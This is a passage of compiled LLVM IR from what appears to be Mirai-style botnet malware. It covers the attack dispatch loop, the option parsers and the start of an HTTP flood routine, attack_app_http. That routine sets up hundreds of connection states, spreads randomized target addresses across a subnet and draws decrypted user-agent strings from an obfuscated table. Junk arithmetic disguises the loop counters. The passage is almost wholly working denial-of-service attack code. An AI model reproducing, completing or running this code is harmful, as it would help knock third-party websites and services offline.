; <label>:37:                                     ; preds = %67, %36
  %38 = load i32, i32* %15, align 4
  %39 = load i8, i8* @methods_len, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp slt i32 %38, %40
  br i1 %41, label %42, label %72

; <label>:42:                                     ; preds = %37
  %43 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %44 = load i32, i32* %15, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %43, i64 %45
  %47 = load %struct.attack_method*, %struct.attack_method** %46, align 8
  %48 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %47, i32 0, i32 1
  %49 = load i8, i8* %48, align 8
  %50 = zext i8 %49 to i32
  %51 = load i8, i8* %8, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %50, %52
  br i1 %53, label %54, label %66

; <label>:54:                                     ; preds = %42
  %55 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %55, i64 %57
  %59 = load %struct.attack_method*, %struct.attack_method** %58, align 8
  %60 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %59, i32 0, i32 0
  %61 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %60, align 8
  %62 = load i8, i8* %9, align 1
  %63 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %64 = load i8, i8* %11, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %61(i8 zeroext %62, %struct.attack_target* %63, i8 zeroext %64, %struct.attack_option* %65)
  br label %72

; <label>:66:                                     ; preds = %42
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %15, align 4
  %69 = sub i32 0, 1
  %70 = sub i32 %68, %69
  %71 = add nsw i32 %68, 1
  store i32 %70, i32* %15, align 4
  br label %37

; <label>:72:                                     ; preds = %54, %37
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %40

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %37

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = sub i32 0, %31
  %33 = sub i32 0, 1
  %34 = add i32 %32, %33
  %35 = sub i32 0, %34
  %36 = add nsw i32 %31, 1
  store i32 %35, i32* %5, align 4
  br label %10

; <label>:37:                                     ; preds = %10
  %38 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %39 = bitcast %struct.attack_option* %38 to i8*
  call void @free(i8* %39) #6
  br label %40

; <label>:40:                                     ; preds = %37, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %41

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %43

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = sub i32 %36, 1033833086
  %38 = add i32 %37, 1
  %39 = add i32 %38, 1033833086
  %40 = add nsw i32 %36, 1
  store i32 %39, i32* %10, align 4
  br label %11

; <label>:41:                                     ; preds = %11
  %42 = load i8*, i8** %9, align 8
  store i8* %42, i8** %5, align 8
  br label %43

; <label>:43:                                     ; preds = %41, %27
  %44 = load i8*, i8** %5, align 8
  ret i8* %44
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_http_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca [10241 x i8], align 16
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.fd_set, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %struct.attack_http_state*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.sockaddr_in, align 4
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %34 = alloca [10240 x i8], align 16
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %13, align 8
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i8* @attack_get_opt_str(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 21, i8* null)
  store i8* %66, i8** %14, align 8
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i8* @attack_get_opt_str(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %69, i8** %15, align 8
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i8* @attack_get_opt_str(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 8, i8* null)
  store i8* %72, i8** %16, align 8
  %73 = load i8, i8* %7, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = call i8* @attack_get_opt_str(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %75, i8** %17, align 8
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 24, i32 1)
  store i32 %78, i32* %18, align 4
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 7, i32 80)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %19, align 2
  %83 = bitcast [10241 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 10241, i32 16, i1 false)
  %84 = load i8*, i8** %16, align 8
  %85 = icmp eq i8* %84, null
  br i1 %85, label %89, label %86

; <label>:86:                                     ; preds = %4
  %87 = load i8*, i8** %17, align 8
  %88 = icmp eq i8* %87, null
  br i1 %88, label %89, label %90

; <label>:89:                                     ; preds = %86, %4
  br label %2803

; <label>:90:                                     ; preds = %86
  %91 = load i8*, i8** %17, align 8
  %92 = call i32 @util_strlen(i8* %91)
  %93 = icmp sgt i32 %92, 255
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %90
  br label %2803

; <label>:95:                                     ; preds = %90
  %96 = load i8*, i8** %16, align 8
  %97 = call i32 @util_strlen(i8* %96)
  %98 = icmp sgt i32 %97, 127
  br i1 %98, label %99, label %100

; <label>:99:                                     ; preds = %95
  br label %2803

; <label>:100:                                    ; preds = %95
  %101 = load i8*, i8** %15, align 8
  %102 = call i32 @util_strlen(i8* %101)
  %103 = icmp sgt i32 %102, 9
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %100
  br label %2803

; <label>:105:                                    ; preds = %100
  store i32 0, i32* %10, align 4
  br label %106

; <label>:106:                                    ; preds = %139, %105
  %107 = load i32, i32* %10, align 4
  %108 = load i8*, i8** %15, align 8
  %109 = call i32 @util_strlen(i8* %108)
  %110 = icmp slt i32 %107, %109
  br i1 %110, label %111, label %145

; <label>:111:                                    ; preds = %106
  %112 = load i8*, i8** %15, align 8
  %113 = load i32, i32* %10, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = sext i8 %116 to i32
  %118 = icmp sge i32 %117, 97
  br i1 %118, label %119, label %138

; <label>:119:                                    ; preds = %111
  %120 = load i8*, i8** %15, align 8
  %121 = load i32, i32* %10, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  %124 = load i8, i8* %123, align 1
  %125 = sext i8 %124 to i32
  %126 = icmp sle i32 %125, 122
  br i1 %126, label %127, label %138

; <label>:127:                                    ; preds = %119
  %128 = load i8*, i8** %15, align 8
  %129 = load i32, i32* %10, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = sext i8 %132 to i32
  %134 = sub i32 0, 32
  %135 = add i32 %133, %134
  %136 = sub nsw i32 %133, 32
  %137 = trunc i32 %135 to i8
  store i8 %137, i8* %131, align 1
  br label %138

; <label>:138:                                    ; preds = %127, %119, %111
  br label %139

; <label>:139:                                    ; preds = %138
  %140 = load i32, i32* %10, align 4
  %141 = add i32 %140, 1690040480
  %142 = add i32 %141, 1
  %143 = sub i32 %142, 1690040480
  %144 = add nsw i32 %140, 1
  store i32 %143, i32* %10, align 4
  br label %106

; <label>:145:                                    ; preds = %106
  %146 = load i32, i32* %18, align 4
  %147 = icmp sgt i32 %146, 256
  br i1 %147, label %148, label %149

; <label>:148:                                    ; preds = %145
  store i32 256, i32* %18, align 4
  br label %149

; <label>:149:                                    ; preds = %148, %145
  call void @table_unlock_val(i8 zeroext 52)
  call void @table_unlock_val(i8 zeroext 53)
  call void @table_unlock_val(i8 zeroext 54)
  call void @table_unlock_val(i8 zeroext 55)
  call void @table_unlock_val(i8 zeroext 56)
  call void @table_unlock_val(i8 zeroext 57)
  call void @table_unlock_val(i8 zeroext 58)
  call void @table_unlock_val(i8 zeroext 59)
  call void @table_unlock_val(i8 zeroext 60)
  call void @table_unlock_val(i8 zeroext 61)
  call void @table_unlock_val(i8 zeroext 62)
  %150 = load i32, i32* %18, align 4
  %151 = sext i32 %150 to i64
  %152 = call noalias i8* @calloc(i64 %151, i64 3140) #6
  %153 = bitcast i8* %152 to %struct.attack_http_state*
  store %struct.attack_http_state* %153, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  br label %154

; <label>:154:                                    ; preds = %354, %149
  %155 = load i32, i32* %9, align 4
  %156 = load i32, i32* %18, align 4
  %157 = icmp slt i32 %155, %156
  br i1 %157, label %158, label %360

; <label>:158:                                    ; preds = %154
  %159 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %160 = load i32, i32* %9, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %159, i64 %161
  %163 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %162, i32 0, i32 1
  store i8 0, i8* %163, align 4
  %164 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %167, i32 0, i32 0
  store i32 -1, i32* %168, align 4
  %169 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %170 = load i32, i32* %9, align 4
  %171 = load i8, i8* %5, align 1
  %172 = zext i8 %171 to i32
  %173 = srem i32 %170, %172
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i64 %174
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i32 0, i32 1
  %177 = load i32, i32* %176, align 4
  %178 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %179 = load i32, i32* %9, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %178, i64 %180
  %182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %181, i32 0, i32 4
  store i32 %177, i32* %182, align 4
  %183 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %184 = load i32, i32* %9, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %183, i64 %185
  %187 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %186, i32 0, i32 6
  %188 = getelementptr inbounds [257 x i8], [257 x i8]* %187, i32 0, i32 0
  %189 = load i8*, i8** %17, align 8
  %190 = call i32 @util_strcpy(i8* %188, i8* %189)
  %191 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %192 = load i32, i32* %9, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %191, i64 %193
  %195 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %194, i32 0, i32 6
  %196 = getelementptr inbounds [257 x i8], [257 x i8]* %195, i64 0, i64 0
  %197 = load i8, i8* %196, align 4
  %198 = sext i8 %197 to i32
  %199 = icmp ne i32 %198, 47
  br i1 %199, label %200, label %228

; <label>:200:                                    ; preds = %158
  %201 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %202 = load i32, i32* %9, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %201, i64 %203
  %205 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %204, i32 0, i32 6
  %206 = getelementptr inbounds [257 x i8], [257 x i8]* %205, i32 0, i32 0
  %207 = getelementptr inbounds i8, i8* %206, i64 1
  %208 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %209 = load i32, i32* %9, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %208, i64 %210
  %212 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %211, i32 0, i32 6
  %213 = getelementptr inbounds [257 x i8], [257 x i8]* %212, i32 0, i32 0
  %214 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %215 = load i32, i32* %9, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %217, i32 0, i32 6
  %219 = getelementptr inbounds [257 x i8], [257 x i8]* %218, i32 0, i32 0
  %220 = call i32 @util_strlen(i8* %219)
  %221 = sext i32 %220 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %207, i8* %213, i64 %221, i32 1, i1 false)
  %222 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %223 = load i32, i32* %9, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %222, i64 %224
  %226 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %225, i32 0, i32 6
  %227 = getelementptr inbounds [257 x i8], [257 x i8]* %226, i64 0, i64 0
  store i8 47, i8* %227, align 4
  br label %228

; <label>:228:                                    ; preds = %200, %158
  %229 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %230 = load i32, i32* %9, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %229, i64 %231
  %233 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %232, i32 0, i32 10
  %234 = getelementptr inbounds [9 x i8], [9 x i8]* %233, i32 0, i32 0
  %235 = load i8*, i8** %15, align 8
  %236 = call i32 @util_strcpy(i8* %234, i8* %235)
  %237 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %238 = load i32, i32* %9, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %237, i64 %239
  %241 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %240, i32 0, i32 9
  %242 = getelementptr inbounds [9 x i8], [9 x i8]* %241, i32 0, i32 0
  %243 = load i8*, i8** %15, align 8
  %244 = call i32 @util_strcpy(i8* %242, i8* %243)
  %245 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %246 = load i32, i32* %9, align 4
  %247 = sext i32 %246 to i64
  %248 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %245, i64 %247
  %249 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %248, i32 0, i32 7
  %250 = getelementptr inbounds [129 x i8], [129 x i8]* %249, i32 0, i32 0
  %251 = load i8*, i8** %16, align 8
  %252 = call i32 @util_strcpy(i8* %250, i8* %251)
  %253 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %254 = load i32, i32* %9, align 4
  %255 = load i8, i8* %5, align 1
  %256 = zext i8 %255 to i32
  %257 = srem i32 %254, %256
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %253, i64 %258
  %260 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %259, i32 0, i32 2
  %261 = load i8, i8* %260, align 4
  %262 = zext i8 %261 to i32
  %263 = icmp slt i32 %262, 32
  br i1 %263, label %264, label %297

; <label>:264:                                    ; preds = %228
  %265 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %266 = load i32, i32* %9, align 4
  %267 = load i8, i8* %5, align 1
  %268 = zext i8 %267 to i32
  %269 = srem i32 %266, %268
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %265, i64 %270
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %271, i32 0, i32 1
  %273 = load i32, i32* %272, align 4
  %274 = call i32 @ntohl(i32 %273) #7
  %275 = call i32 @rand_next()
  %276 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %277 = load i32, i32* %9, align 4
  %278 = load i8, i8* %5, align 1
  %279 = zext i8 %278 to i32
  %280 = srem i32 %277, %279
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %276, i64 %281
  %283 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %282, i32 0, i32 2
  %284 = load i8, i8* %283, align 4
  %285 = zext i8 %284 to i32
  %286 = lshr i32 %275, %285
  %287 = add i32 %274, 1775656617
  %288 = add i32 %287, %286
  %289 = sub i32 %288, 1775656617
  %290 = add i32 %274, %286
  %291 = call i32 @htonl(i32 %289) #7
  %292 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %293 = load i32, i32* %9, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %295, i32 0, i32 4
  store i32 %291, i32* %296, align 4
  br label %297

; <label>:297:                                    ; preds = %264, %228
  %298 = call i32 @rand_next()
  %299 = urem i32 %298, 5
  switch i32 %299, label %345 [
    i32 0, label %300
    i32 1, label %309
    i32 2, label %318
    i32 3, label %327
    i32 4, label %336
  ]

; <label>:300:                                    ; preds = %297
  call void @table_unlock_val(i8 zeroext 63)
  %301 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %301, i64 %303
  %305 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %304, i32 0, i32 5
  %306 = getelementptr inbounds [512 x i8], [512 x i8]* %305, i32 0, i32 0
  %307 = call i8* @table_retrieve_val(i32 63, i32* null)
  %308 = call i32 @util_strcpy(i8* %306, i8* %307)
  call void @table_lock_val(i8 zeroext 63)
  br label %345

; <label>:309:                                    ; preds = %297
  call void @table_unlock_val(i8 zeroext 64)
  %310 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %311 = load i32, i32* %9, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %313, i32 0, i32 5
  %315 = getelementptr inbounds [512 x i8], [512 x i8]* %314, i32 0, i32 0
  %316 = call i8* @table_retrieve_val(i32 64, i32* null)
  %317 = call i32 @util_strcpy(i8* %315, i8* %316)
  call void @table_lock_val(i8 zeroext 64)
  br label %345

; <label>:318:                                    ; preds = %297
  call void @table_unlock_val(i8 zeroext 65)
  %319 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %320 = load i32, i32* %9, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %319, i64 %321
  %323 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %322, i32 0, i32 5
  %324 = getelementptr inbounds [512 x i8], [512 x i8]* %323, i32 0, i32 0
  %325 = call i8* @table_retrieve_val(i32 65, i32* null)
  %326 = call i32 @util_strcpy(i8* %324, i8* %325)
  call void @table_lock_val(i8 zeroext 65)
  br label %345

; <label>:327:                                    ; preds = %297
  call void @table_unlock_val(i8 zeroext 66)
  %328 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %329 = load i32, i32* %9, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %328, i64 %330
  %332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %331, i32 0, i32 5
  %333 = getelementptr inbounds [512 x i8], [512 x i8]* %332, i32 0, i32 0
  %334 = call i8* @table_retrieve_val(i32 66, i32* null)
  %335 = call i32 @util_strcpy(i8* %333, i8* %334)
  call void @table_lock_val(i8 zeroext 66)
  br label %345

; <label>:336:                                    ; preds = %297
  call void @table_unlock_val(i8 zeroext 67)
  %337 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %338 = load i32, i32* %9, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %337, i64 %339
  %341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %340, i32 0, i32 5
  %342 = getelementptr inbounds [512 x i8], [512 x i8]* %341, i32 0, i32 0
  %343 = call i8* @table_retrieve_val(i32 67, i32* null)
  %344 = call i32 @util_strcpy(i8* %342, i8* %343)
  call void @table_lock_val(i8 zeroext 67)
  br label %345

